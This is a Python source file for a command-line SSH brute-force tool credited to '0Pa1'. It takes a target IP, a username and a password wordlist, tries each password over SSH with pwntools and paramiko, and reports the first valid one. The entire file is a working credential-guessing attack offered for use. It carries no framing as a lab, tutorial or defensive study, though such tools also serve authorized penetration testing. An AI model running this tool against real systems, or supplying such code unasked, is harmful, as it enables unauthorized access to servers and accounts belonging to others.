from pwn import *
import argparse
import paramiko
import ipaddress


# checks if IP provided by user is valid
def valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return ip
    except ValueError:
        raise argparse.ArgumentTypeError(f'Invalid IP address {ip}')


def main():
    parser = argparse.ArgumentParser(description='SSH Brute Force tool by 0Pa1.')
    parser.add_argument('-t', '--target', required=True, type=valid_ip, help='Target IP')
    parser.add_argument('-u', '--username', required=True, help=' Target Username')
    parser.add_argument('-w', '--wordlist', required=True, help='Full path to password file')

    args = parser.parse_args()

    host = args.target
    username = args.username
    password_file_path = args.wordlist

    attempts = 0

    try:
        with open(password_file_path, 'r') as password_list:
            for password in password_list:
                password = password.strip()
                attempts += 1
                print(f'[{attempts}] Attempting Password : {password}')

                try:
                    response = ssh(host=host, user=username, password=password, timeout=1)
                    if response.connected():
                        print(f'[+] Valid Password : {password}')
                        response.close()
                        break
                    response.close()
                except paramiko.ssh_exception.AuthenticationException:
                    print('[X] Invalid Password! \n' + '-' * 10)
                except (EOFError, paramiko.ssh_exception.SSHException) as e:
                    print(f'[!] SSH Exception : {str(e)}')
                    break
    except FileNotFoundError:
        print(f'Error : Wordlist {password_file_path} not found.')
    except Exception as e:
        print(f'[!] An unexpected error occurred : {str(e)}')


if __name__ == '__main__':
    main()
